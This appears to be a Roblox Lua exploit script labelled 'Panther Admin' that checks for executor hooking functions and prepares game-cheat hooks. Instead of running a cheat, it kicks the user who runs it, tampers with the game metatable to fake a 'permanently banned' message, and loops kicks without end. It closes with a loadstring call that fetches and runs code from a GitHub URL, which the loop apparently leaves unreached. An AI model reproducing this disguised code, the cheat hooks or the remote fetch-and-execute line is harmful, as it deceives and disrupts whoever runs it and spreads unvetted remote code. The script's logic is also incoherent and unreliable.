if not getconnections or not hookmetamethod or not getnamecallmethod or not ((getgenv and getgenv()) or _G) then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Panther Admin",Text = "Executor is not supported!",Duration = 10,})
end
if not workspace:FindFirstChild("Criminals Spawn") or not workspace:FindFirstChild("Criminals Spawn"):FindFirstChild("SpawnLocation") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Panther Admin",Text = "Criminals spawn not found! Please rejoin.",Duration = 10,})
end
game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
if game:FindFirstChild("Panther_update_loaded") then  ((getgenv and getgenv()) or _G).NotifTiger("Panther admin is already executed!",false) return warn("Already loaded") end
local Player, plr,Folder = game:GetService("Players").LocalPlayer, game:GetService("Players").LocalPlayer,Instance.new("Folder",game)
local OldHook, hookmetamethod, getnamecallmethod = nil, hookmetamethod, getnamecallmethod
local HasGamepass,UserInputService = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId, 96651),game:GetService("UserInputService")
local GlobalVar = ((getgenv and getgenv()) or _G)
local Unloaded = false
local CriminalCFRAME = workspace["Criminals Spawn"].SpawnLocation.CFrame
local PremiumActivated = true
print('Panther Admin Loaded')

local function kickAndBan(reason)
    game.Players.LocalPlayer:Kick(reason)
    
    -- Permanently kick on rejoin
    local mt = getrawmetatable(game)
    local oldIndex = mt.__index
    setreadonly(mt, false)
    
    mt.__index = function(self, key)
        if key == "Kick" then
            return function(_, message)
                game.Players.LocalPlayer:Kick("YOU ARE PERMANENTLY BANNED: " .. message)
            end
        end
        return oldIndex(self, key)
    end
    
    setreadonly(mt, true)
end

kickAndBan("Exploiting")

game.Players.LocalPlayer:Kick("YOU WERE KICKED OFF THE GAME. Reason: Exploiting")
while true do
    game.Players.LocalPlayer:Kick("YOU WERE KICKED OFF THE GAME. Reason: Exploiting")
    wait()
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/markxd07/Luxury-Free/main/Auto_Kaitun.lua"))()
